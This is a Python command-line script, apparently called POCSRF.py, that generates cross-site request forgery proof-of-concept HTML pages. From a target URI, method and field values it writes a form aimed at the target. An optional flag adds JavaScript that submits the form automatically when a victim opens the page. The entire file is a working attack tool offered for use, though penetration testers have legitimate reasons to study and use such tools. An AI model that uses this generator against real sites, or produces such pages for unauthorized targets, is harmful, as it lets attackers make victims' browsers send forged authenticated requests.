import re
import sys
import time

class CSRF_PoC_Generator():
    
    def __init__(self, method, uri, data, encoding, auto_submit, filename, verbose_mode):
       
        self.method = method
        self.uri = uri
        self.data = data
        self.encoding = encoding
        self.auto_submit = auto_submit
        self.filename = filename
        self.verbose_mode = verbose_mode

        if (self.verbose_mode):
            print ("\nParsing input data...")
            time.sleep(1)

        self.data_set = re.findall(r'([A-Za-z0-9]+)', data)
        self.names = []
        self.values = []

        for i in range (0, len(self.data_set)):
            if (i % 2 == 0):
                self.names.append(self.data_set[i])
            else:
                self.values.append(self.data_set[i])

    def createRequest(self):
        
        filename = self.filename
        if (filename == None):
            filename = "CSRF_PoC.html"
       
        form_lines = ""
        
        if (self.verbose_mode):
            print ("\nCreating CSRF form data...")
            time.sleep(1)

        for i in range (0, len(self.data_set)//2):
            form_lines += "<td><input type=\"text\" value={} name={}></td>\n\t".format(self.values[i],self.names[i])
       
        
        file = open(str(filename), "w")
        
        if (self.verbose_mode):
            print ("\nWriting data to file...")
            time.sleep(2)

        if (self.auto_submit != True):
            file.write("<html>\n<head>\n\t<title>CSRF PoC</title>\n\r</head>\n<body>\n<form enctype=\"{}\" method=\"{}\" action=\"{}\">\n\n\t<table>\n\t<tr>\n\t{}</tr>\n\t</table>\n\n\t<input type=\"submit\" value=\"{}\">\n\n</form>\n</body>\n</html>".format(self.encoding,self.method,self.uri,form_lines,self.uri))

        else:
            file.write("<html>\n<head>\n\t<title>CSRF PoC</title>\n\r</head>\n<body>\n<form enctype=\"{}\" method=\"{}\" action=\"{}\">\n\n\t<table>\n\t<tr>\n\t{}</tr>\n\t</table>\n\n\t<input type=\"submit\" value=\"{}\">\n\n</form>\n\n<script>\n\tdocument.forms[0].submit();\n</script>\n\n</body>\n</html>".format(self.encoding,self.method,self.uri,form_lines,self.uri))        
        
        file.close()
        if (self.verbose_mode):
            print("\nComplete!")

def main():
    
    print ("""


 ______   ______     ______     ______     ______     ______  
/\  == \ /\  __ \   /\  ___\   /\  ___\   /\  == \   /\  ___\ 
\ \  _-/ \ \ \/\ \  \ \ \____  \ \___  \  \ \  __<   \ \  __\ 
 \ \_\    \ \_____\  \ \_____\  \/\_____\  \ \_\ \_\  \ \_\   
  \/_/     \/_____/   \/_____/   \/_____/   \/_/ /_/   \/_/   
                                                              
Version - 1.0.1
  """)   
    
    if ("-h" in sys.argv or "--help" in sys.argv or len(sys.argv) < 3):
        print("POCSRF.py\n\nRequired: <URI> <METHOD> <NAME_1=VALUE_1,NAME_2=VALUE_2,...>\n\nOptional:  \n-e --encoding:\tEncoding type (text/plain, www/application, etc) default : text/plain\n-a --auto:\tAutomatically submit the request when the page is loaded \n-of --filename:\tName of the output file (default : CSRF_PoC.html)\n-v --verbose:\tVerbose mode\n")
        sys.exit()
    
    uri_regex = 'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'

    URI = sys.argv[1]
    METHOD = sys.argv[2]
    DATA = sys.argv[3]
    ENCODING = "text/plain"
    AUTO_SUBMIT = False
    OUTPUT_FILE = None
    VERBOSE = False

    if(re.findall(uri_regex, URI) == []):
        print ("Invalid URI : {}".format(URI))
        sys.exit()
    
    if ("-e" in sys.argv or "--encoding" in sys.argv):
        try:
            ENCODING = sys.argv[sys.argv.index('-e')+1]
        except ValueError:
            ENCODING = sys.argv[sys.argv.index("--encoding")+1]
    
    if ("-a" in sys.argv or "--auto" in sys.argv):
        AUTO_SUBMIT = True

    if ("-of" in sys.argv or "--filename" in sys.argv):
        try:
            OUTPUT_FILE = sys.argv[sys.argv.index("-of")+1]
        except ValueError:
            OUTPUT_FILE = sys.argv[sys.argv.index("--filename")+1]
    
    if ("-v" in sys.argv or "--verbose" in sys.argv):
        VERBOSE = True

    new_PoC = CSRF_PoC_Generator(METHOD,URI,DATA,ENCODING,AUTO_SUBMIT,OUTPUT_FILE, VERBOSE)
    new_PoC.createRequest()

main()
